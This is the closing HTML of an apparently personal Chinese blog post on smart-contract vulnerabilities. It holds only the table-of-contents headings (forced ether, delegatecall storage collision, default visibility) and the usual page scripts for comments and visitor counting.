理论推算</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">4.3.5.</span> <span class="toc-text">4. 注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E8%84%9A%E6%9C%AC"><span class="toc-number">4.4.</span> <span class="toc-text">读取脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E"><span class="toc-number">4.4.1.</span> <span class="toc-text">使用说明</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%84%8F%E5%A4%96%E4%B9%8B%E8%B4%A2"><span class="toc-number">5.</span> <span class="toc-text">意外之财</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%90%88%E7%BA%A6%E7%A4%BA%E4%BE%8B"><span class="toc-number">5.0.1.</span> <span class="toc-text">1. 合约示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%97%AE%E9%A2%98%E4%B8%8E%E9%A3%8E%E9%99%A9%EF%BC%88%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%87%BA%E7%8E%B0%E2%80%9C%E6%84%8F%E5%A4%96%E4%B9%8B%E8%B4%A2%E2%80%9D%EF%BC%89"><span class="toc-number">5.0.2.</span> <span class="toc-text">2. 问题与风险（为什么会出现“意外之财”）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%A4%BA%E4%BE%8B%E6%94%BB%E5%87%BB-%E8%A7%A6%E5%8F%91%E5%9C%BA%E6%99%AF"><span class="toc-number">5.0.3.</span> <span class="toc-text">3. 示例攻击&#x2F;触发场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%89%E7%A7%8D%E4%B8%8D%E4%BC%9A%E8%A7%A6%E5%8F%91-EVM-%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%BD%86%E4%BC%9A%E5%BD%B1%E5%93%8D%E5%90%88%E7%BA%A6%E4%BD%99%E9%A2%9D%E7%9A%84%E9%80%94%E5%BE%84"><span class="toc-number">5.0.4.</span> <span class="toc-text">4. 三种不会触发 EVM 合约代码执行但会影响合约余额的途径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E5%BE%A1%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="toc-number">5.0.5.</span> <span class="toc-text">5. 防御与最佳实践</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Delegatecall"><span class="toc-number">6.</span> <span class="toc-text">Delegatecall</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Vulnerable-FibonacciBalance%EF%BC%88%E5%AD%98%E5%9C%A8-delegatecall-%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AD%98%E5%82%A8%E6%B1%A1%E6%9F%93%E9%97%AE%E9%A2%98%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">1. Vulnerable: FibonacciBalance（存在 delegatecall 导致的存储污染问题）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Intended-library-FibonacciLib%EF%BC%88%E6%AD%A3%E5%B8%B8%E5%AE%9E%E7%8E%B0%EF%BC%8C%E6%8C%89%E8%87%AA%E8%BA%AB-storage-%E5%B8%83%E5%B1%80%E5%86%99%E5%85%A5%EF%BC%89"><span class="toc-number">6.2.</span> <span class="toc-text">2. Intended library: FibonacciLib（正常实现，按自身 storage 布局写入）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%81%B6%E6%84%8F%E5%BA%93%EF%BC%9AMaliciousLib%EF%BC%88%E9%80%9A%E8%BF%87%E5%86%99%E5%85%A5%E7%89%B9%E5%AE%9A-storage-slot-%E6%9D%A5%E7%AF%A1%E6%94%B9%E8%B0%83%E7%94%A8%E8%80%85%E5%90%88%E7%BA%A6%E7%9A%84%E5%85%B3%E9%94%AE%E5%8F%98%E9%87%8F%EF%BC%89"><span class="toc-number">6.3.</span> <span class="toc-text">3. 恶意库：MaliciousLib（通过写入特定 storage slot 来篡改调用者合约的关键变量）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6%EF%BC%88%E7%A4%BA%E4%BE%8B%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%EF%BC%89"><span class="toc-number">6.4.</span> <span class="toc-text">4. 攻击合约（示例攻击流程）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%BC%8F%E6%B4%9E%E8%A6%81%E7%82%B9"><span class="toc-number">6.5.</span> <span class="toc-text">5. 漏洞要点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">6.6.</span> <span class="toc-text">6. 修复建议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E7%9A%84%E5%8F%AF%E8%A7%81%E6%80%A7"><span class="toc-number">7.</span> <span class="toc-text">默认的可见性</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/aaaset/title.png);"><div class="footer-other"><div class="footer-copyright"></div><div class="footer_custom_text">-899</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'kizzy899/kizzy899.github.io',
      'data-repo-id': 'R_kgDONCC1iQ',
      'data-category-id': 'DIC_kwDONCC1ic4CtwTu',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !false) {
    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="8,9,小,金" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>